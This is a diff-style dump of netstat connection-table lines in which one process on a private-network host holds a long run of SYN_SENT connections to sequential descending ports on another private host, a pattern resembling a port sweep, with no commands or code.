+  TCP    192.168.110.29:62771   192.168.110.143:5872   SYN_SENT        16728
+  TCP    192.168.110.29:62772   192.168.110.143:5871   SYN_SENT        16728
+  TCP    192.168.110.29:62773   192.168.110.143:5870   SYN_SENT        16728
+  TCP    192.168.110.29:62774   192.168.110.143:5869   SYN_SENT        16728
+  TCP    192.168.110.29:62775   192.168.110.143:5868   SYN_SENT        16728
+  TCP    192.168.110.29:62776   192.168.110.143:5867   SYN_SENT        16728
+  TCP    192.168.110.29:62777   192.168.110.143:5866   SYN_SENT        16728
+  TCP    192.168.110.29:62778   192.168.110.143:5865   SYN_SENT        16728
+  TCP    192.168.110.29:62779   192.168.110.143:5864   SYN_SENT        16728
+  TCP    192.168.110.29:62780   192.168.110.143:5863   SYN_SENT        16728
+  TCP    192.168.110.29:62781   192.168.110.143:5862   SYN_SENT        16728
+  TCP    192.168.110.29:62782   192.168.110.143:5861   SYN_SENT        16728
+  TCP    192.168.110.29:62783   192.168.110.143:5860   SYN_SENT        16728
+  TCP    192.168.110.29:62784   192.168.110.143:5859   SYN_SENT        16728
+  TCP    192.168.110.29:62785   192.168.110.143:5858   SYN_SENT        16728
+  TCP    192.168.110.29:62786   192.168.110.143:5857   SYN_SENT        16728
+  TCP    192.168.110.29:62787   192.168.110.143:5856   SYN_SENT        16728
+  TCP    192.168.110.29:62788   192.168.110.143:5855   SYN_SENT        16728
+  TCP    192.168.110.29:62789   192.168.110.143:5854   SYN_SENT        16728
+  TCP    192.168.110.29:62790   192.168.110.143:5853   SYN_SENT        16728
+  TCP    192.168.110.29:62791   192.168.110.143:5852   SYN_SENT        16728
+  TCP    192.168.110.29:62792   192.168.110.143:5851   SYN_SENT        16728
+  TCP    192.168.110.29:62793   192.168.110.143:5850   SYN_SENT        16728
+  TCP    192.168.110.29:62794   192.168.110.143:5849   SYN_SENT        16728
+  TCP    192.168.110.29:62795   192.168.110.143:5848   SYN_SENT        16728
+  TCP    192.168.110.29:62796   192.168.110.143:5847   SYN_SENT        16728
+  TCP    192.168.110.29:62797   192.168.110.143:5846   SYN_SENT        16728
+  TCP    192.168.110.29:62798   192.168.110.143:5845   SYN_SENT        16728
+  TCP    192.168.110.29:62799   192.168.110.143:5844   SYN_SENT        16728
+  TCP    192.168.110.29:62800   192.168.110.143:5843   SYN_SENT        16728
+  TCP    192.168.110.29:62801   192.168.110.143:5842   SYN_SENT        16728
+  TCP    192.168.110.29:62802   192.168.110.143:5841   SYN_SENT        16728
+  TCP    192.168.110.29:62803   192.168.110.143:5840   SYN_SENT        16728
+  TCP    192.168.110.29:62804   192.168.110.143:5839   SYN_SENT        16728
+  TCP    192.168.110.29:62805   192.168.110.143:5838   SYN_SENT        16728
+  TCP    192.168.110.29:62806   192.168.110.143:5837   SYN_SENT        16728
+  TCP    192.168.110.29:62807   192.168.110.143:5836   SYN_SENT        16728
+  TCP    192.168.110.29:62808   192.168.110.143:5835   SYN_SENT        16728
+  TCP    192.168.110.29:62809   192.168.110.143:5834   SYN_SENT        16728
+  TCP    192.168.110.29:62810   192.168.110.143:5833   SYN_SENT        16728
+  TCP    192.168.110.29:62811   192.168.110.143:5832   SYN_SENT        16728
+  TCP    192.168.110.29:62812   192.168.110.143:5831   SYN_SENT        16728
+  TCP    192.168.110.29:62813   192.168.110.143:5830   SYN_SENT        16728
+  TCP    192.168.110.29:62814   192.168.110.143:5829   SYN_SENT        16728
+  TCP    192.168.110.29:62815   192.168.110.143:5828   SYN_SENT        16728
+  TCP    192.168.110.29:62816   192.168.110.143:5827   SYN_SENT        16728
+  TCP    192.168.110.29:62817   192.168.110.143:5826   SYN_SENT        16728
+  TCP    192.168.110.29:62818   192.168.110.143:5825   SYN_SENT        16728
+  TCP    192.168.110.29:62819   192.168.110.143:5824   SYN_SENT        16728
+  TCP    192.168.110.29:62820   192.168.110.143:5823   SYN_SENT        16728
+  TCP    192.168.110.29:62821   192.168.110.143:5822   SYN_SENT        16728
+  TCP    192.168.110.29:62822   192.168.110.143:5821   SYN_SENT        16728
+  TCP    192.168.110.29:62823   192.168.110.143:5820   SYN_SENT        16728
+  TCP    192.168.110.29:62824   192.168.110.143:5819   SYN_SENT        16728
+  TCP    192.168.110.29:62825   192.168.110.143:5818   SYN_SENT        16728
+  TCP    192.168.110.29:62826   192.168.110.143:5817   SYN_SENT        16728
+  TCP    192.168.110.29:62827   192.168.110.143:5816   SYN_SENT        16728
+  TCP    192.168.110.29:62828   192.168.110.143:5815   SYN_SENT        16728
+  TCP    192.168.110.29:62829   192.168.110.143:5814   SYN_SENT        16728
+  TCP    192.168.110.29:62830   192.168.110.143:5813   SYN_SENT        16728
+  TCP    192.168.110.29:62831   192.168.110.143:5812   SYN_SENT        16728
+  TCP    192.168.110.29:62832   192.168.110.143:5811   SYN_SENT        16728
+  TCP    192.168.110.29:62833   192.168.110.143:5810   SYN_SENT        16728
+  TCP    192.168.110.29:62834   192.168.110.143:5809   SYN_SENT        16728
+  TCP    192.168.110.29:62835   192.168.110.143:5808   SYN_SENT        16728
+  TCP    192.168.110.29:62836   192.168.110.143:5807   SYN_SENT        16728
+  TCP    192.168.110.29:62837   192.168.110.143:5806   SYN_SENT        16728
+  TCP    192.168.110.29:62838   192.168.110.143:5805   SYN_SENT        16728
+  TCP    192.168.110.29:62839   192.168.110.143:5804   SYN_SENT        16728
+  TCP    192.168.110.29:62840   192.168.110.143:5803   SYN_SENT        16728
+  TCP    192.168.110.29:62841   192.168.110.143:5802   SYN_SENT        16728
+  TCP    192.168.110.29:62842   192.168.110.143:5801   SYN_SENT        16728
+  TCP    192.168.110.29:62843   192.168.110.143:5800   SYN_SENT        16728
+  TCP    192.168.110.29:62844   192.168.110.143:5799   SYN_SENT        16728
+  TCP    192.168.110.29:62845   192.168.110.143:5798   SYN_SENT        16728
+  TCP    192.168.110.29:62846   192.168.110.143:5797   SYN_SENT        16728
+  TCP    192.168.110.29:62847   192.168.110.143:5796   SYN_SENT        16728
+  TCP    192.168.110.29:62848   192.168.110.143:5795   SYN_SENT        16728
+  TCP    192.168.110.29:62849   192.168.110.143:5794   SYN_SENT        16728
+  TCP    192.168.110.29:62850   192.168.110.143:5793   SYN_SENT        16728
+  TCP    192.168.110.29:62851   192.168.110.143:5792   SYN_SENT        16728
+  TCP    192.168.110.29:62852   192.168.110.143:5791   SYN_SENT        16728
+  TCP    192.168.110.29:62853   192.168.110.143:5790   SYN_SENT        16728
+  TCP    192.168.110.29:62854   192.168.110.143:5789   SYN_SENT        16728
+  TCP    192.168.110.29:62855   192.168.110.143:5788   SYN_SENT        16728
+  TCP    192.168.110.29:62856   192.168.110.143:5787   SYN_SENT        16728
+  TCP    192.168.110.29:62857   192.168.110.143:5786   SYN_SENT        16728
+  TCP    192.168.110.29:62858   192.168.110.143:5785   SYN_SENT        16728
+  TCP    192.168.110.29:62859   192.168.110.143:5784   SYN_SENT        16728
+  TCP    192.168.110.29:62860   192.168.110.143:5783   SYN_SENT        16728
+  TCP    192.168.110.29:62861   192.168.110.143:5782   SYN_SENT        16728
+  TCP    192.168.110.29:62862   192.168.110.143:5781   SYN_SENT        16728
+  TCP    192.168.110.29:62863   192.168.110.143:5780   SYN_SENT        16728
+  TCP    192.168.110.29:62864   192.168.110.143:5779   SYN_SENT        16728
+  TCP    192.168.110.29:62865   192.168.110.143:5778   SYN_SENT        16728
+  TCP    192.168.110.29:62866   192.168.110.143:5777   SYN_SENT        16728
+  TCP    192.168.110.29:62867   192.168.110.143:5776   SYN_SENT        16728
+  TCP    192.168.110.29:62868   192.168.110.143:5775   SYN_SENT        16728
+  TCP    192.168.110.29:62869   192.168.110.143:5774   SYN_SENT        16728
+  TCP    192.168.110.29:62870   192.168.110.143:5773   SYN_SENT        16728
+  TCP    192.168.110.29:62871   192.168.110.143:5772   SYN_SENT        16728
+  TCP    192.168.110.29:62872   192.168.110.143:5771   SYN_SENT        16728
+  TCP    192.168.110.29:62873   192.168.110.143:5770   SYN_SENT        16728
+  TCP    192.168.110.29:62874   192.168.110.143:5769   SYN_SENT        16728
+  TCP    192.168.110.29:62875   192.168.110.143:5768   SYN_SENT        16728
+  TCP    192.168.110.29:62876   192.168.110.143:5767   SYN_SENT        16728
+  TCP    192.168.110.29:62877   192.168.110.143:5766   SYN_SENT        16728
+  TCP    192.168.110.29:62878   192.168.110.143:5765   SYN_SENT        16728
+  TCP    192.168.110.29:62879   192.168.110.143:5764   SYN_SENT        16728
+  TCP    192.168.110.29:62880   192.168.110.143:5763   SYN_SENT        16728
+  TCP    192.168.110.29:62881   192.168.110.143:5762   SYN_SENT        16728
+  TCP    192.168.110.29:62882   192.168.110.143:5761   SYN_SENT        16728
+  TCP    192.168.110.29:62883   192.168.110.143:5760   SYN_SENT        16728
+  TCP    192.168.110.29:62884   192.168.110.143:5759   SYN_SENT        16728
+  TCP    192.168.110.29:62885   192.168.110.143:5758   SYN_SENT        16728
+  TCP    192.168.110.29:62886   192.168.110.143:5757   SYN_SENT        16728
+  TCP    192.168.110.29:62887   192.168.110.143:5756   SYN_SENT        16728
+  TCP    192.168.110.29:62888   192.168.110.143:5755   SYN_SENT        16728
+  TCP    192.168.110.29:62889   192.168.110.143:5754   SYN_SENT        16728
+  TCP    192.168.110.29:62890   192.168.110.143:5753   SYN_SENT        16728
+  TCP    192.168.110.29:62891   192.168.110.143:5752   SYN_SENT        16728
+  TCP    192.168.110.29:62892   192.168.110.143:5751   SYN_SENT        16728
+  TCP    192.168.110.29:62893   192.168.110.143:5750   SYN_SENT        16728
+  TCP    192.168.110.29:62894   192.168.110.143:5749   SYN_SENT        16728
+  TCP    192.168.110.29:62895   192.168.110.143:5748   SYN_SENT        16728
+  TCP    192.168.110.29:62896   192.168.110.143:5747   SYN_SENT        16728
+  TCP    192.168.110.29:62897   192.168.110.143:5746   SYN_SENT        16728
+  TCP    192.168.110.29:62898   192.168.110.143:5745   SYN_SENT        16728
+  TCP    192.168.110.29:62899   192.168.110.143:5744   SYN_SENT        16728
+  TCP    192.168.110.29:62900   192.168.110.143:5743   SYN_SENT        16728
+  TCP    192.168.110.29:62901   192.168.110.143:5742   SYN_SENT        16728
+  TCP    192.168.110.29:62903   192.168.110.143:5741   SYN_SENT        16728
+  TCP    192.168.110.29:62904   192.168.110.143:5740   SYN_SENT        16728
+  TCP    192.168.110.29:62905   192.168.110.143:5739   SYN_SENT        16728
+  TCP    192.168.110.29:62906   192.168.110.143:5738   SYN_SENT        16728
+  TCP    192.168.110.29:62907   192.168.110.143:5737   SYN_SENT        16728
+  TCP    192.168.110.29:62908   192.168.110.143:5736   SYN_SENT        16728
+  TCP    192.168.110.29:62909   192.168.110.143:5735   SYN_SENT        16728
+  TCP    192.168.110.29:62910   192.168.110.143:5734   SYN_SENT        16728
+  TCP    192.168.110.29:62911   192.168.110.143:5733   SYN_SENT        16728
+  TCP    192.168.110.29:62912   192.168.110.143:5732   SYN_SENT        16728
+  TCP    192.168.110.29:62913   192.168.110.143:5731   SYN_SENT        16728
+  TCP    192.168.110.29:62914   192.168.110.143:5730   SYN_SENT        16728
+  TCP    192.168.110.29:62915   192.168.110.143:5729   SYN_SENT        16728
+  TCP    192.168.110.29:62916   192.168.110.143:5728   SYN_SENT        16728
+  TCP    192.168.110.29:62917   192.168.110.143:5727   SYN_SENT        16728
+  TCP    192.168.110.29:62918   192.168.110.143:5726   SYN_SENT        16728
+  TCP    192.168.110.29:62919   192.168.110.143:5725   SYN_SENT        16728
+  TCP    192.168.110.29:62920   192.168.110.143:5724   SYN_SENT        16728
+  TCP    192.168.110.29:62921   192.168.110.143:5723   SYN_SENT        16728
+  TCP    192.168.110.29:62922   192.168.110.143:5722   SYN_SENT        16728
+  TCP    192.168.110.29:62923   192.168.110.143:5721   SYN_SENT        16728
+  TCP    192.168.110.29:62924   192.168.110.143:5720   SYN_SENT        16728
+  TCP    192.168.110.29:62925   192.168.110.143:5719   SYN_SENT        16728
+  TCP    192.168.110.29:62926   192.168.110.143:5718   SYN_SENT        16728
+  TCP    192.168.110.29:62927   192.168.110.143:5717   SYN_SENT        16728
+  TCP    192.168.110.29:62928   192.168.110.143:5716   SYN_SENT        16728
+  TCP    192.168.110.29:62929   192.168.110.143:5715   SYN_SENT        16728
+  TCP    192.168.110.29:62930   192.168.110.143:5714   SYN_SENT        16728
+  TCP    192.168.110.29:62931   192.168.110.143:5713   SYN_SENT        16728
+  TCP    192.168.110.29:62932   192.168.110.143:5712   SYN_SENT        16728
+  TCP    192.168.110.29:62933   192.168.110.143:5711   SYN_SENT        16728
+  TCP    192.168.110.29:62934   192.168.110.143:5710   SYN_SENT        16728
+  TCP    192.168.110.29:62935   192.168.110.143:5709   SYN_SENT        16728
+  TCP    192.168.110.29:62936   192.168.110.143:5708   SYN_SENT        16728
+  TCP    192.168.110.29:62937   192.168.110.143:5707   SYN_SENT        16728
+  TCP    192.168.110.29:62938   192.168.110.143:5706   SYN_SENT        16728
+  TCP    192.168.110.29:62939   192.168.110.143:5705   SYN_SENT        16728
+  TCP    192.168.110.29:62940   192.168.110.143:5704   SYN_SENT        16728
+  TCP    192.168.110.29:62941   192.168.110.143:5703   SYN_SENT        16728
+  TCP    192.168.110.29:62942   192.168.110.143:5702   SYN_SENT        16728
+  TCP    192.168.110.29:62943   192.168.110.143:5701   SYN_SENT        16728
+  TCP    192.168.110.29:62944   192.168.110.143:5700   SYN_SENT        16728
+  TCP    192.168.110.29:62945   192.168.110.143:5699   SYN_SENT        16728
+  TCP    192.168.110.29:62946   192.168.110.143:5698   SYN_SENT        16728
+  TCP    192.168.110.29:62947   192.168.110.143:5697   SYN_SENT        16728
+  TCP    192.168.110.29:62948   192.168.110.143:5696   SYN_SENT        16728
+  TCP    192.168.110.29:62949   192.168.110.143:5695   SYN_SENT        16728
+  TCP    192.168.110.29:62950   192.168.110.143:5694   SYN_SENT        16728
+  TCP    192.168.110.29:62951   192.168.110.143:5693   SYN_SENT        16728
+  TCP    192.168.110.29:62952   192.168.110.143:5692   SYN_SENT        16728
+  TCP    192.168.110.29:62953   192.168.110.143:5691   SYN_SENT        16728
+  TCP    192.168.110.29:62954   192.168.110.143:5690   SYN_SENT        16728
+  TCP    192.168.110.29:62955   192.168.110.143:5689   SYN_SENT        16728
+  TCP    192.168.110.29:62956   192.168.110.143:5688   SYN_SENT        16728
+  TCP    192.168.110.29:62957   192.168.110.143:5687   SYN_SENT        16728
+  TCP    192.168.110.29:62958   192.168.110.143:5686   SYN_SENT        16728
+  TCP    192.168.110.29:62959   192.168.110.143:5685   SYN_SENT        16728
+  TCP    192.168.110.29:62960   192.168.110.143:5684   SYN_SENT        16728
+  TCP    192.168.110.29:62961   192.168.110.143:5683   SYN_SENT        16728
+  TCP    192.168.110.29:62962   192.168.110.143:5682   SYN_SENT        16728
+  TCP    192.168.110.29:62963   192.168.110.143:5681   SYN_SENT        16728
+  TCP    192.168.110.29:62964   192.168.110.143:5680   SYN_SENT        16728
+  TCP    192.168.110.29:62965   192.168.110.143:5679   SYN_SENT        16728
+  TCP    192.168.110.29:62966   192.168.110.143:5678   SYN_SENT        16728
+  TCP    192.168.110.29:62967   192.168.110.143:5677   SYN_SENT        16728
+  TCP    192.168.110.29:62968   192.168.110.143:5676   SYN_SENT        16728
+  TCP    192.168.110.29:62969   192.168.110.143:5675   SYN_SENT        16728
+  TCP    192.168.110.29:62970   192.168.110.143:5674   SYN_SENT        16728
+  TCP    192.168.110.29:62971   192.168.110.143:5673   SYN_SENT        16728
+  TCP    192.168.110.29:62972   192.168.110.143:5672   SYN_SENT        16728
+  TCP    192.168.110.29:62973   192.168.110.143:5671   SYN_SENT        16728
+  TCP    192.168.110.29:62974   192.168.110.143:5670   SYN_SENT        16728
+  TCP    192.168.110.29:62975   192.168.110.143:5669   SYN_SENT        16728
+  TCP    192.168.110.29:62976   192.168.110.143:5668   SYN_SENT        16728
+  TCP    192.168.110.29:62977   192.168.110.143:5667   SYN_SENT        16728
+  TCP    192.168.110.29:62978   192.168.110.143:5666   SYN_SENT        16728
+  TCP    192.168.110.29:62979   192.168.110.143:5665   SYN_SENT        16728
+  TCP    192.168.110.29:62980   192.168.110.143:5664   SYN_SENT        16728
+  TCP    192.168.110.29:62981   192.168.110.143:5663   SYN_SENT        16728
+  TCP    192.168.110.29:62982   192.168.110.143:5662   SYN_SENT        16728
+  TCP    192.168.110.29:62983   192.168.110.143:5661   SYN_SENT        16728
+  TCP    192.168.110.29:62984   192.168.110.143:5660   SYN_SENT        16728
+  TCP    192.168.110.29:62985   192.168.110.143:5659   SYN_SENT        16728
+  TCP    192.168.110.29:62986   192.168.110.143:5658   SYN_SENT        16728
+  TCP    192.168.110.29:62987   192.168.110.143:5657   SYN_SENT        16728
+  TCP    192.168.110.29:62988   192.168.110.143:5656   SYN_SENT        16728
+  TCP    192.168.110.29:62989   192.168.110.143:5655   SYN_SENT        16728
+  TCP    192.168.110.29:62990   192.168.110.143:5654   SYN_SENT        16728
+  TCP    192.168.110.29:62991   192.168.110.143:5653   SYN_SENT        16728
+  TCP    192.168.110.29:62992   192.168.110.143:5652   SYN_SENT        16728
+  TCP    192.168.110.29:62993   192.168.110.143:5651   SYN_SENT        16728
+  TCP    192.168.110.29:62994   192.168.110.143:5650   SYN_SENT        16728
+  TCP    192.168.110.29:62995   192.168.110.143:5649   SYN_SENT        16728
+  TCP    192.168.110.29:62996   192.168.110.143:5648   SYN_SENT        16728
+  TCP    192.168.110.29:62997   192.168.110.143:5647   SYN_SENT        16728
+  TCP    192.168.110.29:62998   192.168.110.143:5646   SYN_SENT        16728
+  TCP    192.168.110.29:62999   192.168.110.143:5645   SYN_SENT        16728
+  TCP    192.168.110.29:63000   192.168.110.143:5644   SYN_SENT        16728
+  TCP    192.168.110.29:63001   192.168.110.143:5643   SYN_SENT        16728
+  TCP    192.168.110.29:63002   192.168.110.143:5642   SYN_SENT        16728
+  TCP    192.168.110.29:63003   192.168.110.143:5641   SYN_SENT        16728
+  TCP    192.168.110.29:63004   192.168.110.143:5640   SYN_SENT        16728
+  TCP    192.168.110.29:63005   192.168.110.143:5639   SYN_SENT        16728
+  TCP    192.168.110.29:63006   192.168.110.143:5638   SYN_SENT        16728
+  TCP    192.168.110.29:63007   192.168.110.143:5637   SYN_SENT        16728
+  TCP    192.168.110.29:63008   192.168.110.143:5636   SYN_SENT        16728
+  TCP    192.168.110.29:63009   192.168.110.143:5635   SYN_SENT        16728
+  TCP    192.168.110.29:63010   192.168.110.143:5634   SYN_SENT        16728
+  TCP    192.168.110.29:63011   192.168.110.143:5633   SYN_SENT        16728
+  TCP    192.168.110.29:63012   192.168.110.143:5632   SYN_SENT        16728
+  TCP    192.168.110.29:63013   192.168.110.143:5631   SYN_SENT        16728
+  TCP    192.168.110.29:63014   192.168.110.143:5630   SYN_SENT        16728
+  TCP    192.168.110.29:63015   192.168.110.143:5629   SYN_SENT        16728
+  TCP    192.168.110.29:63016   192.168.110.143:5628   SYN_SENT        16728
+  TCP    192.168.110.29:63017   192.168.110.143:5627   SYN_SENT        16728
+  TCP    192.168.110.29:63018   192.168.110.143:5626   SYN_SENT        16728
+  TCP    192.168.110.29:63019   192.168.110.143:5625   SYN_SENT        16728
+  TCP    192.168.110.29:63020   192.168.110.143:5624   SYN_SENT        16728
+  TCP    192.168.110.29:63021   192.168.110.143:5623   SYN_SENT        16728
+  TCP    192.168.110.29:63022   192.168.110.143:5622   SYN_SENT        16728
+  TCP    192.168.110.29:63023   192.168.110.143:5621   SYN_SENT        16728
+  TCP    192.168.110.29:63024   192.168.110.143:5620   SYN_SENT        16728
+  TCP    192.168.110.29:63025   192.168.110.143:5619   SYN_SENT        16728
+  TCP    192.168.110.29:63026   192.168.110.143:5618   SYN_SENT        16728
+  TCP    192.168.110.29:63027   192.168.110.143:5617   SYN_SENT        16728
+  TCP    192.168.110.29:63028   192.168.110.143:5616   SYN_SENT        16728
+  TCP    192.168.110.29:63029   192.168.110.143:5615   SYN_SENT        16728
+  TCP    192.168.110.29:63030   192.168.110.143:5614   SYN_SENT        16728
+  TCP    192.168.110.29:63031   192.168.110.143:5613   SYN_SENT        16728
+  TCP    192.168.110.29:63032   192.168.110.143:5612   SYN_SENT        16728
+  TCP    192.168.110.29:63033   192.168.110.143:5611   SYN_SENT        16728
+  TCP    192.168.110.29:63034   192.168.110.143:5610   SYN_SENT        16728
+  TCP    192.168.110.29:63035   192.168.110.143:5609   SYN_SENT        16728
+  TCP    192.168.110.29:63036   192.168.110.143:5608   SYN_SENT        16728
+  TCP    192.168.110.29:63037   192.168.110.143:5607   SYN_SENT        16728
+  TCP    192.168.110.29:63038   192.168.110.143:5606   SYN_SENT        16728
+  TCP    192.168.110.29:63039   192.168.110.143:5605   SYN_SENT        16728
+  TCP    192.168.110.29:63040   192.168.110.143:5604   SYN_SENT        16728
+  TCP    192.168.110.29:63041   192.168.110.143:5603   SYN_SENT        16728
+  TCP    192.168.110.29:63042   192.168.110.143:5602   SYN_SENT        16728
+  TCP    192.168.110.29:63043   192.168.110.143:5601   SYN_SENT        16728
+  TCP    192.168.110.29:63044   192.168.110.143:5600   SYN_SENT        16728
+  TCP    192.168.110.29:63045   192.168.110.143:5599   SYN_SENT        16728
+  TCP    192.168.110.29:63046   192.168.110.143:5598   SYN_SENT        16728
+  TCP    192.168.110.29:63047   192.168.110.143:5597   SYN_SENT        16728
+  TCP    192.168.110.29:63048   192.168.110.143:5596   SYN_SENT        16728
+  TCP    192.168.110.29:63049   192.168.110.143:5595   SYN_SENT        16728
+  TCP    192.168.110.29:63050   192.168.110.143:5594   SYN_SENT        16728
+  TCP    192.168.110.29:63051   192.168.110.143:5593   SYN_SENT        16728
+  TCP    192.168.110.29:63052   192.168.110.143:5592   SYN_SENT        16728
+  TCP    192.168.110.29:63053   192.168.110.143:5591   SYN_SENT        16728
+  TCP    192.168.110.29:63054   192.168.110.143:5590   SYN_SENT        16728
+  TCP    192.168.110.29:63055   192.168.110.143:5589   SYN_SENT        16728
+  TCP    192.168.110.29:63056   192.168.110.143:5588   SYN_SENT        16728
+  TCP    192.168.110.29:63057   192.168.110.143:5587   SYN_SENT        16728
+  TCP    192.168.110.29:63058   192.168.110.143:5586   SYN_SENT        16728
+  TCP    192.168.110.29:63059   192.168.110.143:5585   SYN_SENT        16728
+  TCP    192.168.110.29:63060   192.168.110.143:5584   SYN_SENT        16728
+  TCP    192.168.110.29:63061   192.168.110.143:5583   SYN_SENT        16728
+  TCP    192.168.110.29:63062   192.168.110.143:5582   SYN_SENT        16728
+  TCP    192.168.110.29:63063   192.168.110.143:5581   SYN_SENT        16728
+  TCP    192.168.110.29:63064   192.168.110.143:5580   SYN_SENT        16728
+  TCP    192.168.110.29:63065   192.168.110.143:5579   SYN_SENT        16728
+  TCP    192.168.110.29:63066   192.168.110.143:5578   SYN_SENT        16728
+  TCP    192.168.110.29:63067   192.168.110.143:5577   SYN_SENT        16728
+  TCP    192.168.110.29:63068   192.168.110.143:5576   SYN_SENT        16728
+  TCP    192.168.110.29:63069   192.168.110.143:5575   SYN_SENT        16728
+  TCP    192.168.110.29:63070   192.168.110.143:5574   SYN_SENT        16728
+  TCP    192.168.110.29:63071   192.168.110.143:5573   SYN_SENT        16728
+  TCP    192.168.110.29:63072   192.168.110.143:5572   SYN_SENT        16728
+  TCP    192.168.110.29:63073   192.168.110.143:5571   SYN_SENT        16728
+  TCP    192.168.110.29:63074   192.168.110.143:5570   SYN_SENT        16728
+  TCP    192.168.110.29:63075   192.168.110.143:5569   SYN_SENT        16728
+  TCP    192.168.110.29:63076   192.168.110.143:5568   SYN_SENT        16728
+  TCP    192.168.110.29:63077   192.168.110.143:5567   SYN_SENT        16728
+  TCP    192.168.110.29:63078   192.168.110.143:5566   SYN_SENT        16728
+  TCP    192.168.110.29:63079   192.168.110.143:5565   SYN_SENT        16728
+  TCP    192.168.110.29:63080   192.168.110.143:5564   SYN_SENT        16728
+  TCP    192.168.110.29:63081   192.168.110.143:5563   SYN_SENT        16728
+  TCP    192.168.110.29:63082   192.168.110.143:5562   SYN_SENT        16728
+  TCP    192.168.110.29:63083   192.168.110.143:5561   SYN_SENT        16728
+  TCP    192.168.110.29:63084   192.168.110.143:5560   SYN_SENT        16728
+  TCP    192.168.110.29:63085   192.168.110.143:5559   SYN_SENT        16728
+  TCP    192.168.110.29:63086   192.168.110.143:5558   SYN_SENT        16728
+  TCP    192.168.110.29:63087   192.168.110.143:5557   SYN_SENT        16728
+  TCP    192.168.110.29:63088   192.168.110.143:5556   SYN_SENT        16728
+  TCP    192.168.110.29:63089   192.168.110.143:5555   SYN_SENT        16728
+  TCP    192.168.110.29:63090   192.168.110.143:5554   SYN_SENT        16728
+  TCP    192.168.110.29:63091   192.168.110.143:5553   SYN_SENT        16728
+  TCP    192.168.110.29:63092   192.168.110.143:5552   SYN_SENT        16728
+  TCP    192.168.110.29:63093   192.168.110.143:5551   SYN_SENT        16728
+  TCP    192.168.110.29:63094   192.168.110.143:5550   SYN_SENT        16728
+  TCP    192.168.110.29:63095   192.168.110.143:5549   SYN_SENT        16728
+  TCP    192.168.110.29:63096   192.168.110.143:5548   SYN_SENT        16728
+  TCP    192.168.110.29:63097   192.168.110.143:5547   SYN_SENT        16728
+  TCP    192.168.110.29:63098   192.168.110.143:5546   SYN_SENT        16728
+  TCP    192.168.110.29:63099   192.168.110.143:5545   SYN_SENT        16728
+  TCP    192.168.110.29:63100   192.168.110.143:5544   SYN_SENT        16728
+  TCP    192.168.110.29:63102   192.168.110.143:5543   SYN_SENT        16728
+  TCP    192.168.110.29:63103   192.168.110.143:5542   SYN_SENT        16728
+  TCP    192.168.110.29:63104   192.168.110.143:5541   SYN_SENT        16728
+  TCP    192.168.110.29:63105   192.168.110.143:5540   SYN_SENT        16728
+  TCP    192.168.110.29:63106   192.168.110.143:5539   SYN_SENT        16728
+  TCP    192.168.110.29:63107   192.168.110.143:5538   SYN_SENT        16728
+  TCP    192.168.110.29:63108   192.168.110.143:5537   SYN_SENT        16728
+  TCP    192.168.110.29:63109   192.168.110.143:5536   SYN_SENT        16728
+  TCP    192.168.110.29:63110   192.168.110.143:5535   SYN_SENT        16728
+  TCP    192.168.110.29:63111   192.168.110.143:5534   SYN_SENT        16728
+  TCP    192.168.110.29:63112   192.168.110.143:5533   SYN_SENT        16728
+  TCP    192.168.110.29:63113   192.168.110.143:5532   SYN_SENT        16728
+  TCP    192.168.110.29:63114   192.168.110.143:5531   SYN_SENT        16728
+  TCP    192.168.110.29:63115   192.168.110.143:5530   SYN_SENT        16728
+  TCP    192.168.110.29:63116   192.168.110.143:5529   SYN_SENT        16728
+  TCP    192.168.110.29:63117   192.168.110.143:5528   SYN_SENT        16728
+  TCP    192.168.110.29:63118   192.168.110.143:5527   SYN_SENT        16728
+  TCP    192.168.110.29:63119   192.168.110.143:5526   SYN_SENT        16728
+  TCP    192.168.110.29:63121   192.168.110.143:5525   SYN_SENT        16728
+  TCP    192.168.110.29:63122   192.168.110.143:5524   SYN_SENT        16728
+  TCP    192.168.110.29:63123   192.168.110.143:5523   SYN_SENT        16728
+  TCP    192.168.110.29:63124   192.168.110.143:5522   SYN_SENT        16728
+  TCP    192.168.110.29:63125   192.168.110.143:5521   SYN_SENT        16728
+  TCP    192.168.110.29:63126   192.168.110.143:5520   SYN_SENT        16728
+  TCP    192.168.110.29:63127   192.168.110.143:5519   SYN_SENT        16728
+  TCP    192.168.110.29:63128   192.168.110.143:5518   SYN_SENT        16728
+  TCP    192.168.110.29:63129   192.168.110.143:5517   SYN_SENT        16728
+  TCP    192.168.110.29:63130   192.168.110.143:5516   SYN_SENT        16728
+  TCP    192.168.110.29:63131   192.168.110.143:5515   SYN_SENT        16728
+  TCP    192.168.110.29:63132   192.168.110.143:5514   SYN_SENT        16728
+  TCP    192.168.110.29:63133   192.168.110.143:5513   SYN_SENT        16728
+  TCP    192.168.110.29:63134   192.168.110.143:5512   SYN_SENT        16728
+  TCP    192.168.110.29:63135   192.168.110.143:5511   SYN_SENT        16728
+  TCP    192.168.110.29:63136   192.168.110.143:5510   SYN_SENT        16728
+  TCP    192.168.110.29:63137   192.168.110.143:5509   SYN_SENT        16728
+  TCP    192.168.110.29:63138   192.168.110.143:5508   SYN_SENT        16728
+  TCP    192.168.110.29:63139   192.168.110.143:5507   SYN_SENT        16728
+  TCP    192.168.110.29:63140   192.168.110.143:5506   SYN_SENT        16728
+  TCP    192.168.110.29:63141   192.168.110.143:5505   SYN_SENT        16728
+  TCP    192.168.110.29:63142   192.168.110.143:5504   SYN_SENT        16728
+  TCP    192.168.110.29:63143   192.168.110.143:5503   SYN_SENT        16728
+  TCP    192.168.110.29:63144   192.168.110.143:5502   SYN_SENT        16728
+  TCP    192.168.110.29:63145   192.168.110.143:5501   SYN_SENT        16728
+  TCP    192.168.110.29:63146   192.168.110.143:5500   SYN_SENT        16728
+  TCP    192.168.110.29:63147   192.168.110.143:5499   SYN_SENT        16728
+  TCP    192.168.110.29:63148   192.168.110.143:5498   SYN_SENT        16728
+  TCP    192.168.110.29:63149   192.168.110.143:5497   SYN_SENT        16728
+  TCP    192.168.110.29:63150   192.168.110.143:5496   SYN_SENT        16728
+  TCP    192.168.110.29:63151   192.168.110.143:5495   SYN_SENT        16728
+  TCP    192.168.110.29:63152   192.168.110.143:5494   SYN_SENT        16728
+  TCP    192.168.110.29:63153   192.168.110.143:5493   SYN_SENT        16728
+  TCP    192.168.110.29:63154   192.168.110.143:5492   SYN_SENT        16728
+  TCP    192.168.110.29:63155   192.168.110.143:5491   SYN_SENT        16728
+  TCP    192.168.110.29:63156   192.168.110.143:5490   SYN_SENT        16728
+  TCP    192.168.110.29:63157   192.168.110.143:5489   SYN_SENT        16728
